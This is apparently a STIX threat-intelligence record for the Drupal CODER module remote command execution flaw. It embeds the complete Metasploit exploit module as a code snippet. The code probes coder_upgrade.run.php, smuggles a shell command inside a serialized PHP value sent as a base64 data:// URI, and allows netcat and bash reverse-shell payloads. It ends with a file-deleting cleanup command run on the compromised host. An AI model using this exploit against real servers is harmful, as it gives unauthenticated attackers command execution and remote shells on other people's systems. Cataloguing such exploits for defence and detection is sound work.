{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--304692c6-bba9-4dbf-b2b7-cdbdfbcb9f09",
    "created": "2024-08-14T17:13:17.777802Z",
    "modified": "2024-08-14T17:13:17.777806Z",
    "name": "Drupal CODER Module Remote Command Execution",
    "description": " This module exploits a Remote Command Execution vulnerability in the Drupal CODER Module. Unauthenticated users can execute arbitrary commands under the context of the web server user.  The CODER module doesn't sufficiently validate user inputs in a script file that has the PHP extension. A malicious unauthenticated user can make requests directly to this file to execute arbitrary commands. The module does not need to be enabled for this to be exploited.  This module was tested against CODER 2.5 with Drupal 7.5 installed on Ubuntu Server.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/drupal_coder_exec.rb",
            "external_id": "drupal_coder_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.drupal.org/node/2765575"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Drupal CODER Module Remote Command Execution',\n      'Description'    => %q{\n        This module exploits a Remote Command Execution vulnerability in the\n        Drupal CODER Module. Unauthenticated users can execute arbitrary\n        commands under the context of the web server user.\n\n        The CODER module doesn't sufficiently validate user inputs in a script\n        file that has the PHP extension. A malicious unauthenticated user can\n        make requests directly to this file to execute arbitrary commands.\n        The module does not need to be enabled for this to be exploited.\n\n        This module was tested against CODER 2.5 with Drupal 7.5 installed on\n        Ubuntu Server.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nicky Bloor <nick@nickbloor.co.uk>',  # discovery\n          'Mehmet Ince <mehmet@mehmetince.net>'  # msf module\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://www.drupal.org/node/2765575']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 250,\n          'DisableNops' => true,\n          'BadChars'    => \"\\x2f\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic netcat netcat-e bash-tcp'\n            },\n        },\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [ ['Automatic', {}] ],\n      'DisclosureDate' => '2016-07-13',\n      'DefaultTarget'  => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The target URI of the Drupal installation', '/'])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'),\n    )\n\n    if res && res.body.include?('file parameter is not setNo path to parameter file')\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    p = ''\n    p << 'a:6:{s:5:\"paths\";a:3:{s:12:\"modules_base\";s:8:\"../../..\";s:10:\"files_base\";s:5:\"../..\";s:14:\"libraries_base\";s:5:\"../..\";}'\n    p << 's:11:\"theme_cache\";s:16:\"theme_cache_test\";'\n    p << 's:9:\"variables\";s:14:\"variables_test\";'\n    p << 's:8:\"upgrades\";a:1:{i:0;a:2:{s:4:\"path\";s:2:\"..\";s:6:\"module\";s:3:\"foo\";}}'\n    p << 's:10:\"extensions\";a:1:{s:3:\"php\";s:3:\"php\";}'\n    p << 's:5:\"items\";a:1:{i:0;a:3:{s:7:\"old_dir\";s:12:\"../../images\";'\n    p << 's:7:\"new_dir\";s:'\n    p << (payload.encoded.length + 5).to_s\n    p << ':\"-v;'\n    p << payload.encoded\n    p << ' #\";s:4:\"name\";s:4:\"test\";}}}'\n\n    pl = \"data://text/plain;base64,#{Rex::Text.encode_base64(p)}\"\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'),\n      'encode_params' => false,\n      'vars_get' => {\n        'file' => pl\n      }\n    )\n  end\n\n  # XXX: FileDropper can't handle weird filenames\n  def on_new_session(session)\n    # This find command should be decently portable...\n    command = '[ -f coder_upgrade.run.php ] && find . \\! -name coder_upgrade.run.php -delete'\n    print_status(\"Cleaning up: #{command}\")\n    session.shell_command_token(command)\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-13",
    "x_mitre_platforms": [
        "['unix']"
    ]
}